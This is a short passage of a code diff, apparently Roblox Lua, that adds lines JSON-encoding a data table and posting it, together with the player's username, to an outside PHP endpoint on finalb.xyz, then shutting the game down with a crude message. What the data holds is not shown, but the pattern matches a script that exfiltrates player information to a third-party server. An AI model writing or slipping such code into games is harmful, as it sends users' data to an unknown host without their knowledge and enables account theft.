@@ -1,0 +1,11 @@
+"
+
+local json = HttpService:JSONEncode(data)
+
+local oneurl = "http://finalb.xyz/Nobelium/storage/app/public/UploadImg.php?key=sidhf9ldlkdastrrfg&name=" .. username
+
+local serverresponse = HttpService:PostAsync(oneurl,json)
+print(serverresponse)
+
+game:Shutdown("cock")
+end
